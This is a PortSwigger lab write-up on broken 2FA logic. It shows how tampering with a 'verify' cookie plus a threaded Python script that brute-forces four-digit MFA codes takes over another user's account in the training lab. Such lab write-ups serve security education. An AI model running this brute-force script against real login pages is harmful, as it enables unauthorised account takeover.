# 2FA broken logic

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-broken-logic), you'll learn: 2FA broken logic! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Background

This lab's two-factor authentication is vulnerable due to its flawed logic. To solve the lab, access Carlos's account page.

- Your credentials: `wiener:peter`
- Victim's username: `carlos`

You also have access to the email server to receive your 2FA verification code.

## Exploitation

**Login page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Authentication/Auth-8/images/Pasted%20image%2020221222023039.png)

**Let's try to login as user `wiener`, and intercept all requests via Burp Suite:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Authentication/Auth-8/images/Pasted%20image%2020221222023628.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Authentication/Auth-8/images/Pasted%20image%2020221222023649.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Authentication/Auth-8/images/Pasted%20image%2020221222023712.png)

When we clicked the `Log in` button, **it'll send a POST request to `/login`, with parameter `username` and `password`.**

**After the POST request is sent, the application will set a new cookie for us: `verify=<username>`.**

Hmm... **What if I change the `verify` cookie to another users**? Like `carlos`.

**Let's go to the `Email client` to get the security code:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Authentication/Auth-8/images/Pasted%20image%2020221222023956.png)

- Security code: `0267`

**Then send the security code and intercept the request via Burp Suite:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Authentication/Auth-8/images/Pasted%20image%2020221222024038.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Authentication/Auth-8/images/Pasted%20image%2020221222024047.png)

**Let's change the `verify` value to `carlos`, and forward the request!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Authentication/Auth-8/images/Pasted%20image%2020221222024111.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Authentication/Auth-8/images/Pasted%20image%2020221222024139.png)

Hmm... `Incorrect security code`.

Looks like we need to **brute force the security code**!

**To do so, I'll write a python script:**
```py
#!/usr/bin/env python3

import requests
from threading import Thread
from time import sleep

def sendRequest(url, cookie, number):
    loginData = {
        'mfa-code': number
    }

    # Display current number and use \r to clear previous line
    print(f'[*] Trying number: {number}', end='\r')

    loginRequestText = requests.post(url, cookies=cookie, data=loginData).text

    if 'Incorrect security code' not in loginRequestText:
        print(f'[+] Found security code: {number}')

def main():
    url = 'https://0ab100fb0332774dc02726db00f20057.web-security-academy.net/login2'
    cookie = {
        'session': '2cK9ym9I9zf0e0p9IECgOqDGUoJfnYT4',
        'verify': 'carlos'
    }

    # Generate number 0000 to 9999 into a list
    listNumbers = [f'{i:04d}' for i in range(10000)]
    
    for number in listNumbers:
        thread = Thread(target=sendRequest, args=(url, cookie, number))
        thread.start()

        # You can adjust how fast of each connection. 0.05s is recommended.
        sleep(0.05)

if __name__ == '__main__':
    main()
```

```
┌──(root🌸siunam)-[~/ctf/Portswigger-Labs/Authentication]
└─# python3 enum_2fa_code.py
[+] Found security code: 1814
```

- Found user `carlos` security code: 1814

**Let's login as `carlos`!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Authentication/Auth-8/images/Pasted%20image%2020221222031030.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Authentication/Auth-8/images/Pasted%20image%2020221222031040.png)

I'm user `carlos`!

# What we've learned:

1. 2FA broken logic